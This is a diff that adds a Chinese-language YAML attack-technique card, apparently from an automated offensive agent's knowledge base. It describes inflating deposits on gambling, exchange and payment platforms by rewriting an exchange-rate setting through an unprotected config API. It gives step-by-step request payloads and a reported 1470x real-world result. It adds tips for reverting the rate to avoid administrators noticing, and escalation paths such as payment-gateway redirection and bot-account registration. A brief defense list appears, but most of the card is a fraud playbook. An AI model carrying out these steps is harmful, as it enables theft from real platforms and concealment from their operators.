@@ -1,0 +1,98 @@
+id: "business-logic-exchange-rate-manipulation"
+name: "汇率/费率操纵——充值/提现放大攻击"
+category: "api-bypass"
+subcategory: "business-logic"
+severity: "critical"
+
+description: |
+  当目标系统允许通过API修改汇率、费率等核心业务参数时，攻击者可以在
+  充值和提现之间制造价差，实现资产的非正常放大。典型场景包括博彩平台
+  (充值按高汇率折算、提现按正常汇率)、交易所、跨境支付系统。
+  
+  本技术基于对某博彩平台的实战验证：将usdtToCnyRate从6.8改为10000后，
+  充值5 USDT到账50000内部币(正常应为34)，放大1470倍。
+
+trigger_signals:
+  - "系统配置API返回汇率/费率字段(usdtToCnyRate, exchangeRate等)"
+  - "充值记录中包含usdtToCnyRate字段(快照值)"
+  - "PUT/POST配置端点无需认证或可低权限访问"
+  - "目标为博彩/支付/交易所类平台"
+  - "存在充值和提现两条资金链路"
+
+payloads:
+  - technique: "基础汇率操纵"
+    payload: |
+      # 1. 改汇率
+      PUT /api/system/config/update
+      {"usdtToCnyRate": 10000}
+      
+      # 2. 创建充值订单
+      POST /api/recharge/create
+      {"amount": 5, "coin": "USDT"}
+      
+      # 3. 转账到平台钱包
+      # 发送 5 USDT 到目标钱包地址
+      
+      # 4. 到账后改回汇率(降低被发现概率)
+      PUT /api/system/config/update
+      {"usdtToCnyRate": 6.8}
+    note: "关键：必须在充值确认前改好汇率(注意缓存TTL)"
+  
+  - technique: "充值订单汇率覆盖"
+    payload: |
+      # 充值订单创建后，汇率字段可能非只读
+      POST /api/recharge/update
+      {"id": 687, "usdtToCnyRate": 10000}
+    note: "RuoYi中充值订单的usdtToCnyRate可通过POST更新，即使amount锁死"
+  
+  - technique: "提现前改回正常汇率"
+    payload: |
+      # 充值后等待到账，余额按高汇率折算
+      # 提现前将汇率改回正常值(避免管理员发现异常)
+      PUT /api/system/config/update
+      {"usdtToCnyRate": 6.8}
+      
+      POST /api/withdraw/create
+      {"amount": 2100, "coin": "USDT", "address": "YOUR_WALLET"}
+    note: "余额已按高汇率入账，提现按正常汇率出金，净赚差价"
+
+success_indicators:
+  - "充值确认后余额为 amount × 操纵汇率(非正常汇率)"
+  - "回读配置确认汇率已变更"
+  - "提现申请创建成功(金额在余额范围内)"
+
+prerequisites:
+  - "系统存在汇率/费率配置字段且可通过API修改"
+  - "配置修改端点无认证或当前权限可写"
+  - "充值流程使用配置汇率而非硬编码"
+  - "后端缓存TTL内操作可完成(或等待缓存过期)"
+
+upgrade_paths:
+  - "多次重复操纵→最大化资产放大"
+  - "结合支付网关替换→充值直接到攻击者账户"
+  - "修改费率/手续费字段→提现时免手续费"
+  - "关闭IP限制→批量注册僵尸账号自动化操作"
+
+defense:
+  - "汇率/费率字段设为只读(仅允许数据库直接修改)"
+  - "充值订单确认后所有金额字段锁定"
+  - "配置变更需多因素审批"
+  - "异常汇率告警(偏离基准值>10%触发)"
+  - "充值到账金额与正常汇率交叉验证"
+
+sources:
+  - agent: "黑骡 v1.1.0"
+    date: "2026-07-21"
+  - ref: "CWE-841: Improper Enforcement of Behavioral Workflow"
+
+tools:
+  - "curl"
+  - "Python requests"
+
+confidence: "high"
+
+limitations:
+  - "后端缓存可能导致汇率修改延迟生效(Java/Spring默认30分钟)"
+  - "全量字段修改可能触发参数校验(需逐个字段写入绕过)"
+  - "提现人工审核是最终阻断点"
+  - "频繁修改汇率可能触发风控告警"
